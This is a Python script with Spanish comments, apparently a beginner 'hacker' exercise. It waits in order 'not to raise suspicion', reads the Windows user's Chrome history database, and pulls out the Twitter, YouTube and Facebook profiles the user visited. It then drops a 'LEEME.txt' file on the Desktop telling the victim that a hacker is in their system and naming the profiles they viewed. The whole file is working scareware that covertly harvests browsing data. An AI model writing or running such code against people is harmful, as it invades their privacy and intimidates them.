#Importamos las librerias necesarias
import random
import sqlite3
from pathlib import Path
from time import sleep
from random import randrange
import re

#Definimos el nombre del archivo para asustar
HACKER_FILE_NAME = "LEEME.txt"


def get_user_path():
    #Devolvemos nuestro disco mas la direccion de nuestro usuario
    user_path = "{}/".format(Path.home())
    return user_path


def delay_action():
    #Dormimos un numero de horas y minutos aleatorios para no velantar sospechas
    number_of_hours = randrange(1, 4)
    number_of_minutes = random.randint(1, 60)
    print("Durmiendo {} horas y {} minutos.".format(number_of_hours, number_of_minutes))
    sleep(3)


def create_hacker_file(user_path):
    try:
        hacker_file = open(user_path + "Desktop\\" + HACKER_FILE_NAME, "w")
        hacker_file.write("Hola crack! Soy un ñaker y me he colado en tu sistema \n")
        hacker_file.close()
        return hacker_file
    except:
        hacker_file = open(HACKER_FILE_NAME, "w")
        hacker_file.write("Hola crack! Soy un ñaker y me he colado en tu sistema \n")
        hacker_file.close()
        return hacker_file


def get_chrome_history(user_path):
    urls = None
    while not urls:
        try:
            history_path = user_path + "/AppData/Local/Google/Chrome/User Data/Default/History"
            connection = sqlite3.connect(history_path)
            cursor = connection.cursor()
            cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
            urls = cursor.fetchall()
            connection.close()
            return urls
        except sqlite3.OperationalError:
            print("Historial inaccesible, reintentando en 3 segundos...")
            sleep(3)


def check_visited_profiles_and_scare_user(hacker_file, chrome_history, user_path):
    profiles_visited = []
    for item in chrome_history:
        results_of_twitter = re.findall("https://twitter.com/([A-Za-z0-9]+)$", item[2])
        results_of_youtube = re.findall("https://www.youtube.com/@([A-Za-z0-9]+)$", item[2])
        results_of_facebook = re.findall("https://www.facebook.com/([A-Za-z0-9]+)$", item[2])

        results = []
        for result in results_of_twitter:
            results.append(result)
        for result in results_of_youtube:
            results.append(result)
        for result in results_of_facebook:
            results.append(result)

        if results and results[0] not in ["notificacions", "home"] and results[0] not in profiles_visited:
            profiles_visited.append(results[0])
    try:
        hacker_file = open(user_path + "Desktop\\" + HACKER_FILE_NAME, "a")
        hacker_file.write("He visto que has estado husmeando en los perfiles de {}...".format(", ".join(profiles_visited)))
        hacker_file.close()
    except:
        hacker_file = open(HACKER_FILE_NAME, "a")
        hacker_file.write("He visto que has estado husmeando en los perfiles de {}...".format(", ".join(profiles_visited)))
        hacker_file.close()


def main():
    # Esperamos entre 1-3 horas para no levantar sospechas
    delay_action()

    # Calculamos la ruta del usuario de windows
    user_path = get_user_path()

    # Recogemos su historial de Google Chrome (cuando sea posible)
    chrome_history = get_chrome_history(user_path)

    # Creamos un archivo en el escritorio
    hacker_file = create_hacker_file(user_path)

    # Escribiendo mensajes de miedo
    check_visited_profiles_and_scare_user(hacker_file, chrome_history, user_path)


if __name__ == "__main__":
    main()
